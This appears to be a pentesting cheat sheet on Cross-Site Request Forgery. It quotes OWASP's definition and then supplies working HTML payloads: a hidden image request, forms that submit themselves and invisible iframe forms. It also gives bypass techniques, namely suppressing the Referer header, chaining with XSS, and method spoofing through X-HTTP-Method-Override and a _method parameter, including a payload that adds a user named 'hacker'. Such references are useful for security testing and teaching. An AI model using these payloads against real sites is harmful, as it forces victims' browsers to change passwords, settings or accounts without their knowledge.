# CSRF

>Cross-Site Request Forgery (CSRF) is a type of attack that occurs when a malicious web site, email, blog, instant message, or program causes a user’s web browser to perform an unwanted action on a trusted site for which the user is currently authenticated. The impact of a successful CSRF attack is limited to the capabilities exposed by the vulnerable application. For example, this attack could result in a transfer of funds, changing a password, or purchasing an item in the user's context. In effect, CSRF attacks are used by an attacker to make a target system perform a function via the target's browser without knowledge of the target user, at least until the unauthorized transaction has been committed.

Source : [OWASP](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet)


## CSRF is possible when ...

* Request is known in advance and is not composed of any random values unknown from the attacker

* Server do not check the `Referer` Header

* Action should be an interesting for the attacker 
	* Password Change
	* Settings Change
	* Personal Informations Change
	* ...

## GET Requests Exploits

### Invisible mage Loading
`<img style="display:none;" src="http://vulnerable-site.com/vuln?param1=value1&param2=value2&..."/>`

### Link clicking
`<link href="http://vulnerable-site.com/vuln?param1=value1&param2=value2&...">`

```
<html> 
	<body>
		<form action="http://vulnerable-site.com/vuln" method="GET"> 
			<input type="hidden" name="param1" value="value1"/>
		</form> 
	</body>
	<script> document.forms[0].submit();</script> 
</html>
```

## POST Requests Exploits

### Visible Form
```html
<html> 
	<body>
		<form action="http://vulnerable-site.com/vuln" method="POST"> 
			<input type="hidden" name="param1" value="value1"/>
		</form>
		<script> document.forms[0].submit();</script>  
	</body>
</html>
```

### Invisible Form
```html
<html> 
	<body>
		<iframe style="display:none" name="invisible-frame"></iframe>
		<form method='POST' action='http://vulnerable-site.com/vuln' target="invisible-frame" id="pwn-form">
		  <input type='hidden' name='param1' value='value1'>
		  <input type='submit' value='submit'>
		</form>
		<script>document.getElementById("pwn-form").submit()</script>
	</body>
</html>

```

## DELETE / PUT Requests Exploits

* `PUT` or `DELETE` requests using HTML forms is not possible as these methods are currently not supported by HTML5 Forms.

* CSRF is possible with the `PUT` and `DELETE` methods, but only with CORS enabled with an unrestrictive policy.

## Protection Bypass

### Referer Header Check Bypass

#### Send a request with no `Referer` header 

`<meta name="referrer" content="no-referrer">`

#### Chain CSRF vulnerability with XSS

`POST http://vulnerable-site.com/xssvuln?id=<script type="text/javascript">window.location="http://vulnerable/vuln";</script>`

### HTTP Method Check Bypass through HTTP Method Tunneling :

#### `X-HTTP-Method-Override` Method

Not all clients can properly issue all HTTP Methods, then some servers offer an HTTP Method Tunneling feature that enables us to "encapsulate" an HTTP Method into another. To do so simply write the HTTP Method request to invoke in an `X-HTTP-Method-Override` HTTP Header and issue the request with a supported method.

This is also a very handy trick to bypass Firewall restrictions on HTTP methods.


#### `_method` Parameter Method

##### Supported on :
**Symfony**

* 2.2 / >=2.3 ([Disabled by default / Enabled by default](https://symfony.com/doc/2.6/cookbook/routing/method_parameters.html#faking-the-method-with-method))

**Laravel**

* >=4.1 ([Enabled by default](https://laravel.com/docs/5.6/routing#form-method-spoofing))

```html
<html>
	<body>
		<form action="http://[HOST]/user/add" method="POST">
			<input name="_method" type="hidden" value="ARBITRARY_METHOD" />
			<input name="user" type="hidden" value="hacker" />
			<input name="password" type="hidden" value="pwd" />
		</form>
		<script>document.forms[0].submit()</script>
	</body>
</html>
```

#### References : 

[Minded Security - Request parameter "_method" may lead to CakePHP CSRF Token Bypass](http://blog.mindedsecurity.com/2016/01/request-parameter-method-may-lead-to.html)